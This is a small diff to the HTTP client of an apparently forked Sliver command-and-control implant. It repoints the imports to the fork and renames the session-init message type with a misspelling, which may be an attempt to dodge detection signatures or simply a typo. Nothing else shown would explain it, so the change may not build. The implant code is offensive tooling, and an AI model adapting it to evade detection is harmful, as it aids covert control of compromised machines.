@@ -39,9 +39,9 @@ import (
 
 	// {{end}}
 
-	"github.com/bishopfox/sliver/implant/sliver/cryptography"
-	"github.com/bishopfox/sliver/implant/sliver/encoders"
-	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/Oni-kuki/sliver/implant/sliver/cryptography"
+	"github.com/Oni-kuki/sliver/implant/sliver/encoders"
+	pb "github.com/Oni-kuki/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 )
 
@@ -177,7 +177,7 @@ type SliverHTTPClient struct {
 func (s *SliverHTTPClient) SessionInit() error {
 	sKey := cryptography.RandomSymmetricKey()
 	s.SessionCtx = cryptography.NewCipherContext(sKey)
-	httpSessionInit := &pb.HTTPSessionInit{Key: sKey[:]}
+	httpSessionInit := &pb.HTTPSescionInit{Key: sKey[:]}
 	data, _ := proto.Marshal(httpSessionInit)
 
 	encryptedSessionInit, err := cryptography.AgeKeyExToServer(data)
